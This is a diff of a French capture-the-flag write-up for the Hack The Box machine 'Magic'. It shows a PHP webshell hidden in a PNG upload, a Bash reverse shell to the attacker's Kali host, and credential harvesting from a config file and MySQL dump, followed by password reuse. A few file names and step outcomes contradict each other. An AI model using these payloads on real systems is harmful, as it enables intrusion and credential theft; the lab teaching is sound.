@@ -521,71 +521,237 @@ Injection SQL sur le formulaire de connexion → contournement de l’authentifi
 
 ### Transformation de l’upload en exécution de commandes
 
-Une fois connecté à la zone d’upload, l’objectif est de vérifier si le mécanisme d’envoi d’image peut être détourné.
+À première vu#e, cette fonctionnalité sert simplement à envoyer une image sur le site. Mais dans une application web, un upload de fichier est toujours un point sensible : si le serveur accepte un fichier contenant du code, et si ce fichier est ensuite interprété par le serveur, l’upload peut devenir un moyen d’exécuter des commandes.
 
-L’application attend normalement un fichier image. L’idée consiste donc à envoyer un fichier qui ressemble à une image du point de vue du formulaire, mais qui contient du code PHP exécutable côté serveur.
+L’objectif est donc de vérifier si tu peux envoyer une image contenant du code PHP.
 
-Un fichier avec une double extension, par exemple du type `.php.png`, permet de tester ce comportement.
+#### Première tentative : envoyer un faux PNG contenant du PHP
 
-Le contenu PHP utilisé reste volontairement minimal :
+Pour ce premier test, le contenu PHP reste volontairement minimal :
 
 ```php
 <?php system($_GET['cmd']); ?>
 ```
 
-Ce code exécute la commande passée dans le paramètre `cmd`.
+Ce code permet de transformer le fichier uploadé en petit webshell.
 
-Après l’upload, le fichier est accessible dans le répertoire suivant :
+Le principe est le suivant : la fonction PHP `system()` exécute une commande système côté serveur. Ici, la commande à exécuter est récupérée depuis le paramètre `cmd` présent dans l’URL.
 
-```text
-/images/uploads/
-```
-
-On peut alors appeler le fichier uploadé en ajoutant un paramètre `cmd` dans l’URL.
-
-Par exemple, pour tester l’exécution de commandes :
+Par exemple, si le fichier est accessible et interprété comme du PHP, une URL de ce type :
 
 ```text
 http://magic.htb/images/uploads/shell.php.png?cmd=id
 ```
 
-La réponse confirme l’exécution de commandes côté serveur. Le contexte obtenu est celui de l’utilisateur web :
+doit exécuter la commande suivante sur la machine cible :
 
-```text
-www-data
+```bash
+id
 ```
 
-À ce stade, nous disposons d’un webshell simple permettant d’exécuter des commandes sur la machine cible.
+Ce test est pratique, car la commande `id` est simple, non destructive, et te permet immédiatement de savoir sous quel utilisateur le serveur web exécute les commandes.
 
-La chaîne devient :
+Une première idée consiste donc à créer un fichier avec une double extension :
 
 ```text
-SQL injection → accès upload → fichier PHP déguisé en image → webshell www-data
+shell.php.png
 ```
+
+L’idée est simple :
+
+```text
+.php  → pour tenter de faire interpréter le fichier comme du PHP
+.png  → pour essayer de le faire accepter comme une image
+```
+
+Tu tentes ensuite d’envoyer ce fichier depuis le formulaire d’upload.
+
+<img src="upload-shell-php-cmd.png" alt="Tentative d’upload d’un fichier shell.php.png sur Magic" class="img-left-60">
+
+Cette première tentative échoue. L’application affiche le message explicite suivant :
+
+<img src="what-are-you-trying-to-do-there.png" alt="Message de refus lors de l’upload du fichier shell.php.png" class="img-left-60">
+
+Cela signifie que l’application détecte que le fichier envoyé n’est pas une image valide, ou qu’il ne respecte pas les contrôles attendus par le formulaire.
+
+Cette étape est intéressante, car elle te montre que le contournement ne se limite pas à renommer un fichier PHP en `.png`. Le serveur applique au moins une vérification supplémentaire.
+
+Il faut donc préparer un fichier qui ressemble davantage à une vraie image, tout en contenant le code PHP minimal présenté plus haut.
+
+#### Deuxième tentative : ajouter le PHP à une vraie image PNG
+
+Pour contourner ce contrôle, tu peux repartir d’une vraie image PNG existante, puis lui ajouter le code PHP minimal.
+
+L’idée est de conserver un fichier qui ressemble vraiment à une image pour les contrôles de l’application, tout en ajoutant du PHP à l’intérieur du fichier.
+
+Sur Kali, un fichier pratique pour ce test est le logo Debian, généralement disponible ici :
+
+```bash
+/usr/share/pixmaps/debian-logo.png
+```
+
+Tu peux vérifier qu’il s’agit bien d’une image PNG avec la commande `file` :
+
+```bash
+file /usr/share/pixmaps/debian-logo.png
+```
+
+La sortie doit indiquer un fichier de type PNG :
+
+```text
+/usr/share/pixmaps/debian-logo.png: PNG image data, 48 x 48, 8-bit/color RGBA, non-interlaced
+```
+
+Tu copies ensuite cette image dans ton répertoire de travail :
+
+```bash
+cp /usr/share/pixmaps/debian-logo.png debian-logo.php.png
+```
+
+Puis tu ajoutes le code PHP minimal à la fin du fichier :
+
+```bash
+cat >> debian-logo.php.png << 'EOF'
+<?php system($_GET['cmd']); ?>
+EOF
+```
+
+Tu obtiens alors un fichier qui reste basé sur une vraie image PNG, mais qui contient aussi ton code PHP.
+
+Tu peux vérifier le résultat avec `file` :
+
+```bash
+file debian-logo.php.png
+```
+
+Le point intéressant est que le fichier est toujours reconnu comme une image PNG :
+
+```text
+debian-logo.php.png: PNG image data, 48 x 48, 8-bit/color RGBA, non-interlaced
+```
+
+Tu peux maintenant retenter l’upload de ce nouveau fichier `shell.php.png`.
+
+Un message en haut à gauche de l'écran t'indique que l'upload a réussi
+
+<img src="magic-debian-logo-php-png-uploaded.png" alt="Message de refus lors de l’upload du fichier shell.php.png" class="img-left-60">
+
+L’étape suivante consiste à appeler le fichier uploadé dans `/images/uploads/` avec le paramètre `cmd`, afin de vérifier si le code PHP ajouté est bien interprété par le serveur.
+
+### Vérification de l’exécution de commandes
+
+Après l’upload du fichier `debian-logo.php.png`, tu testes si le code PHP ajouté à l’image est bien interprété par le serveur.
+
+Pour cela, tu appelles le fichier avec le paramètre `cmd=id` :
+
+```text
+http://magic.htb/images/uploads/debian-logo.php.png?cmd=id
+```
+
+La page affiche le contenu brut de l’image, mais on voit aussi le résultat de la commande `id` à la fin de la réponse :
+
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+<img src="magic-debian-logo-php-png-cmd-id.png" alt="Exécution de la commande id depuis le fichier debian-logo.php.png" class="img-left-60">
+
+Cette sortie confirme que le PHP ajouté à l’image est bien exécuté côté serveur.
+
+Tu as donc obtenu une exécution de commandes avec le contexte du serveur web, c’est-à-dire l’utilisateur `www-data`.
+
+À ce stade, tu ne disposes pas encore d’un shell interactif, mais tu as un webshell fonctionnel. Il suffit de modifier la valeur du paramètre `cmd` pour exécuter d’autres commandes.
+
+
 
 ### Obtention d’un reverse shell
 
-Le webshell permet d’exécuter des commandes, mais ce n’est pas très confortable pour travailler. L’étape suivante consiste donc à obtenir un reverse shell vers Kali.
+Le webshell fonctionne : tu peux exécuter une commande en passant sa valeur dans le paramètre `cmd`.
 
-Sur Kali, on commence par mettre en écoute un port avec `nc` :
+Par exemple :
+
+```text
+http://magic.htb/images/uploads/debian-logo.php.png?cmd=id
+```
+
+C’est suffisant pour confirmer l’exécution de commandes, mais ce n’est pas très pratique pour continuer l’énumération. Chaque commande doit être passée dans l’URL, ce qui devient vite pénible.
+
+L’étape suivante consiste donc à obtenir un reverse shell vers Kali.
+
+Sur Kali, tu commences par ouvrir un port en écoute avec `nc` :
 
 ```bash
 nc -lvnp 4444
 ```
 
-Depuis le webshell, on lance ensuite un reverse shell Bash vers l’adresse VPN de Kali.
+Ensuite, depuis le webshell, tu fais exécuter à la cible une commande qui va initier une connexion vers ta machine Kali.
 
-Le point important ici est d’utiliser `bash -c` :
+Le payload Bash utilisé est le suivant :
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/10.10.16.20/4444 0>&1'
 ```
 
-L’utilisation de `bash -c` est importante, car elle force Bash à interpréter lui-même les redirections ainsi que `/dev/tcp`. Sans cela, la commande peut échouer selon le shell réellement utilisé derrière l’appel PHP.
+Le point important ici est l’utilisation de `bash -c`.
 
-Une fois la commande exécutée depuis le webshell, une connexion arrive sur Kali.
+Cette partie force la cible à exécuter la commande avec Bash :
 
-Nous obtenons alors un shell interactif avec le contexte `www-data`.
+```bash
+bash -c '...'
+```
+
+C’est important, car la redirection `/dev/tcp/10.10.16.20/4444` est une fonctionnalité interprétée par Bash. Si la commande est exécutée par un autre shell, elle peut échouer.
+
+La commande complète signifie donc, de manière simplifiée :
+
+```text
+ouvre un shell interactif Bash
+et connecte-le vers Kali sur le port 4444
+```
+
+Comme cette commande doit être envoyée dans une URL, certains caractères spéciaux doivent être encodés. Dans le navigateur, l’URL appelée ressemble à ceci :
+
+```text
+http://magic.htb/images/uploads/debian-logo.php.png?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.16.20/4444%200%3E%261%27
+```
+
+Une fois l’URL appelée, une connexion arrive sur le listener `nc` ouvert sur Kali.
+
+```bash
+nc -lvnp 4444
+
+listening on [any] 4444 ...
+connect to [10.10.16.20] from (UNKNOWN) [10.129.34.106] 38608
+bash: cannot set terminal process group (1158): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@magic:/var/www/Magic/images/uploads$ 
+```
+
+Tu obtiens alors un shell distant sur la machine cible.
+
+Tu peux vérifier le contexte avec :
+
+```bash
+id
+```
+
+La sortie confirme que le shell est exécuté avec l’utilisateur du serveur web :
+
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+À ce stade, tu as quitté le simple webshell dans l’URL. Tu disposes maintenant d’un reverse shell en tant que `www-data`, ce qui va rendre l’énumération locale beaucoup plus confortable.
+
+La chaîne devient donc :
+
+```text
+Injection SQL
+→ accès à la zone d’upload
+→ image PNG contenant du PHP
+→ webshell
+→ reverse shell www-data
+```
 
 ### Stabilisation du shell
 
@@ -612,82 +778,269 @@ stty rows 40 columns 120
 
 À partir de ce moment, le shell est plus agréable à utiliser : l’affichage est meilleur, les commandes interactives fonctionnent mieux, et l’on peut poursuivre l’énumération locale dans de meilleures conditions.
 
-### Recherche des fichiers de configuration
+### Exploration de l’environnement
 
-Une fois dans le contexte `www-data`, l’objectif est de comprendre comment l’application web fonctionne et où elle stocke ses informations sensibles.
+Le reverse shell obtenu s’exécute avec l’utilisateur `www-data`. Avant de chercher directement une escalade de privilèges, tu peux commencer par explorer rapidement l’environnement local.
 
-Comme l’application est hébergée sous `/var/www`, on commence par rechercher les fichiers de configuration et les fichiers liés à une base de données.
+Un premier réflexe simple consiste à regarder les répertoires présents dans `/home` :
 
-La commande générique retenue est :
+```
+ls -la /home
+```
+
+La sortie montre qu’un seul utilisateur local semble présent :
+
+```
+total 12
+drwxr-xr-x  3 root    root    4096 Jul  6  2021 .
+drwxr-xr-x 24 root    root    4096 Jul  6  2021 ..
+drwxr-xr-x 15 theseus theseus 4096 Jul 12  2021 theseus
+```
+
+Le compte utilisateur intéressant est donc :
+
+```
+theseus
+```
+
+Tu peux ensuite regarder le contenu du répertoire de cet utilisateur :
 
 ```bash
+ls -la /home/theseus
+```
+
+La sortie confirme qu’il s’agit d’un vrai compte utilisateur, avec un environnement classique de session Linux :
+
+```text
+total 80
+drwxr-xr-x 15 theseus theseus 4096 Jul 12  2021 .
+drwxr-xr-x  3 root    root    4096 Jul  6  2021 ..
+-rw-------  1 theseus theseus  636 Jul 12  2021 .ICEauthority
+lrwxrwxrwx  1 theseus theseus    9 Oct 21  2019 .bash_history -> /dev/null
+-rw-r--r--  1 theseus theseus  220 Oct 15  2019 .bash_logout
+-rw-r--r--  1 theseus theseus   15 Oct 21  2019 .bash_profile
+-rw-r--r--  1 theseus theseus 3771 Oct 15  2019 .bashrc
+drwxrwxr-x 13 theseus theseus 4096 Jul  6  2021 .cache
+drwx------ 13 theseus theseus 4096 Jul  6  2021 .config
+drwx------  3 theseus theseus 4096 Jul  6  2021 .gnupg
+drwx------  3 theseus theseus 4096 Jul  6  2021 .local
+drwx------  2 theseus theseus 4096 Jul  6  2021 .ssh
+drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Desktop
+drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Documents
+drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Downloads
+drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Music
+drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Pictures
+drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Public
+drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Templates
+drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Videos
+-r--------  1 theseus theseus   33 Jul  8 08:42 user.txt
+```
+
+Deux éléments sont intéressants.
+
+Le fichier `user.txt` est bien présent dans le répertoire de `theseus`, mais ses permissions sont restrictives :
+
+```text
+-r-------- 1 theseus theseus user.txt
+```
+
+Cela signifie que seul l’utilisateur `theseus` peut le lire. Depuis le shell actuel en `www-data`, tu ne peux donc pas récupérer directement le flag utilisateur.
+
+Le répertoire `.ssh` existe également, mais il est protégé :
+
+```text
+drwx------ 2 theseus theseus .ssh
+```
+
+Là encore, `www-data` ne peut pas simplement y entrer pour récupérer une clé SSH.
+
+Cette vérification confirme donc l’objectif de la suite : il faut trouver un moyen de passer de `www-data` à l’utilisateur `theseus`.
+
+Comme l’application web tourne en PHP dans `/var/www`, la piste logique suivante consiste à rechercher des fichiers de configuration pouvant contenir des identifiants.
+
+Comme l’application web est une application PHP hébergée dans `/var/www`, tu peux ensuite rechercher des fichiers de configuration ou des fichiers liés à une base de données.
+
+Une commande générique utile consiste à chercher les noms de fichiers contenant `config`, `db` ou `database` :
+
+```
 find /var/www -type f \( -iname "*config*" -o -iname "*db*" -o -iname "*database*" \) 2>/dev/null
 ```
 
-Cette recherche permet de découvrir un fichier intéressant :
+La commande retourne un fichier intéressant :
 
-```text
+```
 /var/www/Magic/db.php5
 ```
 
-On lit ensuite son contenu :
+Le nom du fichier est parlant : `db.php5` suggère un fichier PHP lié à la base de données de l’application.
 
-```bash
+Tu peux donc le lire :
+
+```
 cat /var/www/Magic/db.php5
 ```
 
-Le fichier contient des identifiants MySQL utilisés par l’application :
+Résultat :
 
-```text
-database : Magic
-user     : theseus
-password : iamkingtheseus
-host     : localhost
+```bash
+<?php
+class Database
+{
+    private static $dbName = 'Magic' ;
+    private static $dbHost = 'localhost' ;
+    private static $dbUsername = 'theseus';
+    private static $dbUserPassword = 'iamkingtheseus';
+
+    private static $cont  = null;
+
+    public function __construct() {
+        die('Init function is not allowed');
+    }
+
+    public static function connect()
+    {
+        // One connection through whole application
+        if ( null == self::$cont )
+        {
+            try
+            {
+                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
+            }
+            catch(PDOException $e)
+            {
+                die($e->getMessage());
+            }
+        }
+        return self::$cont;
+    }
+
+    public static function disconnect()
+    {
+        self::$cont = null;
+    }
+}
 ```
 
-Ces identifiants ne donnent pas encore directement un accès système, mais ils permettent d’interroger la base de données locale.
+Les informations importantes sont les suivantes :
 
-### Énumération de la base MySQL
+```
+base de données : Magic
+hôte            : localhost
+utilisateur     : theseus
+mot de passe    : iamkingtheseus
+```
 
-Sur la machine cible, le client `mysql` classique n’est pas disponible. En revanche, d’autres outils MySQL sont présents, notamment `mysqlshow` et `mysqldump`.
+Ce fichier est très intéressant pour deux raisons.
 
-On peut d’abord vérifier l’accès à la base `Magic` avec `mysqlshow` :
+D’abord, il montre que l’application utilise une base MySQL locale appelée `Magic`.
+
+Ensuite, il révèle un couple d’identifiants :
+
+```
+theseus:iamkingtheseus
+```
+
+Comme l’utilisateur local `theseus` existe sur la machine, un premier réflexe consiste à tester si ce mot de passe est réutilisé pour le compte Linux.
+
+Tu peux donc tenter une connexion SSH depuis Kali :
+
+```
+ssh theseus@magic.htb
+```
+
+Avec le mot de passe :
+
+```
+iamkingtheseus
+```
+
+Cette tentative échoue. Le mot de passe trouvé dans `db.php5` ne permet donc pas de se connecter directement au compte système `theseus`.
+
+En revanche, ces identifiants sont bien utilisés par l’application pour se connecter à la base MySQL locale. La suite consiste donc à les utiliser pour explorer la base de données `Magic`.
+
+### Exploration de la base MySQL Magic
+
+```bash
+mysql -u theseus -p
+```
+
+Mais sur la machine cible, le binaire `mysql` n’est pas disponible. Cela ne bloque pas complètement l’énumération, car d’autres outils liés à MySQL sont présents.
+
+Tu peux les rechercher avec :
+
+```bash
+which mysql mysqlshow mysqldump
+```
+
+Même si `mysql` est absent, `mysqlshow` et `mysqldump` permettent encore d’interroger la base.
+
+Tu peux d’abord vérifier l’accès à la base `Magic` avec `mysqlshow` :
 
 ```bash
 mysqlshow -u theseus -piamkingtheseus Magic
 ```
 
-L’accès fonctionne et permet d’identifier une table intéressante :
+Résultat :
+
+```bash
+mysqlshow: [Warning] Using a password on the command line interface can be insecure.
+Database: Magic
++--------+
+| Tables |
++--------+
+| login  |
++--------+
+```
+
+La commande confirme l’accès à la base et affiche les tables disponibles. La table intéressante est :
 
 ```text
 login
 ```
 
-On utilise ensuite `mysqldump` pour lire le contenu de cette table :
+À ce stade, le nom de la table est très parlant. Comme l’application possède un formulaire de connexion, une table appelée `login` peut contenir des identifiants utilisés par le site.
+
+Tu peux alors afficher le contenu de cette table avec `mysqldump` :
 
 ```bash
 mysqldump -u theseus -piamkingtheseus Magic login
 ```
 
-Le dump révèle une entrée contenant les identifiants de connexion de l’application :
+Le dump révèle une entrée intéressante :
 
 ```sql
 INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
 ```
 
-Le mot de passe trouvé est donc :
+Tu récupères donc un nouveau mot de passe :
 
 ```text
 Th3s3usW4sK1ng
 ```
 
+Cette fois, le mot de passe n’est pas celui du fichier de configuration MySQL. Il provient de la table `login` de l’application.
+
+Comme le compte local `theseus` existe sur la machine, la prochaine étape logique consiste à tester une réutilisation de ce mot de passe avec l’utilisateur Linux `theseus`.
+
+
+
 ### Réutilisation du mot de passe pour devenir theseus
 
-À ce stade, nous avons un mot de passe issu de la base de données de l’application.
+Comme l’utilisateur local `theseus` existe sur la machine, un premier réflexe pourrait être de tester une connexion SSH depuis Kali :
 
-Comme l’utilisateur MySQL s’appelle `theseus`, il est logique de tester une éventuelle réutilisation de mot de passe avec l’utilisateur local du même nom.
+```bash
+ssh theseus@magic.htb
+```
 
-Depuis le shell `www-data`, on tente donc de changer d’utilisateur :
+La tentative échoue immédiatement avec le message suivant :
+
+```text
+theseus@magic.htb: Permission denied (publickey).
+```
+
+Ce message indique que le serveur SSH attend une authentification par clé publique. L’authentification par mot de passe n’est donc pas utilisable ici pour tester directement le mot de passe trouvé dans `db.php5`.
+
+Depuis le shell `www-data`, on tente alors de changer d’utilisateur :
 
 ```bash
 su - theseus
@@ -707,10 +1060,17 @@ On peut confirmer l’identité courante avec :
 id
 ```
 
+donne 
+
+```bash
+uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
+```
+
 Nous pouvons ensuite lire le flag utilisateur :
 
 ```bash
 cat user.txt
+6461************************d728
 ```
 
 ### Résumé de la chaîne de prise de pied
